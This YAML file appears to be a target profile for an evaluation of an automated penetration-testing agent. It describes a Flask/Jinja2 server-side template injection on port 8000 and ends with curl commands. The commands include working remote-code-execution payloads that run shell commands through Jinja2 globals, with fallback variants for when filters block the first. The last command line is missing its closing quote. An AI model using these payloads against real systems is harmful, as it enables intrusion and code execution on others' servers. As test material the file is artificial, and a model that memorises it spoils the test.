target:
  ip: "EVAL_TARGET_IP"
  hostname: "eval-flask-ssti"
  platform: "linux"

services:
  - port: 8000
    protocol: "tcp"
    name: "http"
    product: "Flask/Werkzeug"
    version: "1.1.1"
    banner: "Werkzeug/1.0.x Python/3.x"
    vulnerabilities:
      - title: "Server-Side Template Injection (SSTI) in Jinja2"
        severity: "critical"
        description: >
          The Flask application uses render_template_string with unsanitized
          user input from the 'name' query parameter. This allows injection
          of Jinja2 template expressions (e.g., {{7*7}}) which can be
          escalated to arbitrary code execution via Python MRO traversal.

directories:
  - path: "/"
    status: 200
    notes: "GET /?name=World returns 'Hello World!'"

quick_wins:
  - vector: "Jinja2 SSTI via name parameter"
    reason: "Direct template injection in query parameter; trivial to detect with {{7*7}}"
    priority: 1

recommended_commands:
  - description: "Confirm SSTI"
    command: "curl 'http://EVAL_TARGET_IP:8000/?name={{7*7}}'"
    expected: "Hello 49!"
  - description: "RCE via Jinja2 MRO traversal"
    command: "curl 'http://EVAL_TARGET_IP:8000/?name={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()}}'"
    notes: "If __import__ is blocked, use lipsum.__globals__['os'].popen('id').read() or cycler.__init__.__globals__['os'].popen('id').read()"
  - description: "Alternative RCE payload"
    command: "curl 'http://EVAL_TARGET_IP:8000/?name={{lipsum.__globals__[%27os%27].popen(%27id%27).read()}}'
